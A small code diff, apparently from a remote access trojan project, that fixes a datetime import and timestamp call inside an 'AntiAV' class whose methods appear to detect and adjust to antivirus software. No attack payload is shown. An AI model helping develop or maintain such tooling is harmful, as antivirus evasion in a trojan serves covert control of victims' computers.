@@ -5,6 +5,7 @@ import logging
 import platform
 import os
 import uuid
+from datetime import datetime
 from typing import List, Dict
 from rat_config import Config
 
@@ -187,7 +188,7 @@ class AntiAV:
                 "status": "error", 
                 "method": "none", 
                 "error": error_msg,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }]
     def adjust_behavior(self, antivirus: Dict) -> Dict:
         """
